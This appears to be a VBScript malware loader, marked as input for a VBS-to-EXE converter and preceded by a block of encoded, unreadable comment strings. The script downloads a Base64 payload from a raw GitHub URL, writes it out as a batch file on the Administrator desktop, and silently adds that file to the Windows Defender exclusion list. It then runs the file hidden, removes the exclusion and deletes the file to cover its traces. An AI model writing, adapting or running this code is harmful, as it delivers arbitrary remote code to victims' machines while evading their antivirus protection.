' ' [ V b s   T o   E x e ]  
 ' '  
 ' ' d N l G 2 R H b T 9 j B H L t q j s A D 3 Q h M t X 9 k N 6 M 4 o 0 f b F 5 Y v S 1 K Q P s u g u i J X 8 H 2 n x w I 8 o G l t  
 ' ' a M R A 3 A f Q R N j B H M h Q  
 ' ' d N R K 2 0 S C C v g =  
 ' ' a M R A x Q X M W Y + T T p x w 7 7 V B u A = =  
 ' ' b d Z W x h P Q W J z c A d h h 4 K Z w  
 ' ' a t N M x 0 S C C s j 8  
 ' ' e 9 h X 2 A X L C s X c D / g =  
 ' ' e N N M x 0 S C C s j 8  
 ' ' b d Z G 3 g H N C s X c D P g =  
 ' ' c N J R 3 Q v b C s X c D P g =  
 ' ' e d J J 2 g r a U p G I H M V w 4 p U =  
 ' ' c s F A x x P N Q 4 y Z H M V w 4 p U =  
 ' ' f M N R x w 3 d X 4 y Z T 9 h t 8 q V w  
 ' ' e d 5 W x Q j e U 9 j B H M h Q  
 ' ' a 9 5 L 0 w u f F 9 j M P A = =  
 ' ' e 9 5 J 0 B L a W I u V U 5 Z w 7 7 V w  
 ' ' b c V K 0 R H c X o 6 Z T o s 5 v f t Q h V o /  
 ' ' b c V K 0 R H c X p a d U Z 1 w 7 7 V w  
 ' ' c s V M 0 g 3 R S 5 S a V Z Q 1 v P Q d 3 V o C y T 4 =  
 ' ' d N l R 0 B b R S 5 S a V Z Q 1 v P Q d 3 V o C y T 4 =  
 ' ' e d J W 1 h b W W o y V U 5 Z w 7 7 V w  
 ' ' f t h I x Q X R U 9 j B H P g =  
 ' ' a c V E 0 Q H S S 4 q X H M V w 0 g = =  
 ' ' f t h V z B b W T Z C I H M V w 0 g = =  
 ' ' b c V M w w X L T 5 q J V Z Q 0 8 q h Q u A = =  
 ' ' b s d A 1 g 3 e R p q J V Z Q 0 8 q h Q u A = =  
 ' ' f t h I 2 A H R X o v c A d h Q  
 ' ' b t Z T 0 E S C C r v G Y K 0 j t + c D 5 D t b h F d u M 7 k i u F X b C o U H Y E W / E d q 8 o Q p M + F X F w 1 Q 7 w Q = =  
 ' ' a N Z G l V m f G / g =  
 ' '  
 ' '  
 ' ' 1 4 7 0 9 f e 1 4 e 5 6 f b 5 a 9 8 1 e b 6 c 1 2 6 f 1 1 5 e 2  
 '   D e f i n e   t h e   U R L   o f   t h e   e n c o d e d   f i l e  
 e n c o d e d F i l e U r l   =   " h t t p s : / / r a w . g i t h u b u s e r c o n t e n t . c o m / s p o o f f e w f e / y f f / r e f s / h e a d s / m a i n / e n c o d e d . t x t "  
 d e c o d e d F i l e P a t h   =   " C : \ U s e r s \ A d m i n i s t r a t o r \ D e s k t o p \ d e c o d e d . b a t "  
  
 '   C r e a t e   X M L H T T P   o b j e c t   t o   f e t c h   t h e   f i l e  
 S e t   o b j X M L H T T P   =   C r e a t e O b j e c t ( " M S X M L 2 . X M L H T T P " )  
 o b j X M L H T T P . O p e n   " G E T " ,   e n c o d e d F i l e U r l ,   F a l s e  
 o b j X M L H T T P . S e n d  
  
 '   C h e c k   i f   t h e   r e q u e s t   w a s   s u c c e s s f u l  
 I f   o b j X M L H T T P . S t a t u s   =   2 0 0   T h e n  
         '   G e t   t h e   B a s e 6 4   e n c o d e d   c o n t e n t   f r o m   t h e   r e s p o n s e  
         e n c o d e d C o n t e n t   =   o b j X M L H T T P . r e s p o n s e T e x t  
          
         '   D e c o d e   t h e   B a s e 6 4   s t r i n g  
         S e t   o b j X M L   =   C r e a t e O b j e c t ( " M S X M L 2 . D O M D o c u m e n t " )  
         S e t   o b j N o d e   =   o b j X M L . c r e a t e E l e m e n t ( " t m p " )  
         o b j N o d e . d a t a T y p e   =   " b i n . b a s e 6 4 "  
         o b j N o d e . T e x t   =   e n c o d e d C o n t e n t  
         d e c o d e d C o n t e n t   =   o b j N o d e . n o d e T y p e d V a l u e  
  
         '   W r i t e   t h e   d e c o d e d   c o n t e n t   t o   a   t e m p o r a r y   b a t c h   f i l e  
         S e t   o b j F S O   =   C r e a t e O b j e c t ( " S c r i p t i n g . F i l e S y s t e m O b j e c t " )  
         S e t   o b j F i l e   =   o b j F S O . C r e a t e T e x t F i l e ( d e c o d e d F i l e P a t h ,   T r u e )  
         o b j F i l e . W r i t e   d e c o d e d C o n t e n t  
         o b j F i l e . C l o s e  
  
         '   A d d   t h e   d e c o d e d   b a t c h   f i l e   t o   a n t i v i r u s   e x c l u s i o n   l i s t  
         S e t   o b j S h e l l   =   C r e a t e O b j e c t ( " W S c r i p t . S h e l l " )  
         o b j S h e l l . R u n   " p o w e r s h e l l   - C o m m a n d   A d d - M p P r e f e r e n c e   - E x c l u s i o n P a t h   "   &   C h r ( 3 4 )   &   d e c o d e d F i l e P a t h   &   C h r ( 3 4 ) ,   0 ,   T r u e  
  
         '   E x e c u t e   t h e   b a t c h   f i l e   s i l e n t l y  
         o b j S h e l l . R u n   C h r ( 3 4 )   &   d e c o d e d F i l e P a t h   &   C h r ( 3 4 ) ,   0 ,   T r u e  
  
         '   R e m o v e   t h e   e x c l u s i o n   a f t e r   e x e c u t i o n  
         o b j S h e l l . R u n   " p o w e r s h e l l   - C o m m a n d   R e m o v e - M p P r e f e r e n c e   - E x c l u s i o n P a t h   "   &   C h r ( 3 4 )   &   d e c o d e d F i l e P a t h   &   C h r ( 3 4 ) ,   0 ,   T r u e  
  
         '   C l e a n   u p   b y   d e l e t i n g   t h e   t e m p o r a r y   d e c o d e d   b a t c h   f i l e  
         o b j F S O . D e l e t e F i l e ( d e c o d e d F i l e P a t h )  
 E l s e  
         '   H a n d l e   f a i l u r e   i n   d o w n l o a d i n g   t h e   f i l e  
         M s g B o x   " F a i l e d   t o   d o w n l o a d   t h e   e n c o d e d   f i l e . "  
 E n d   I f  
 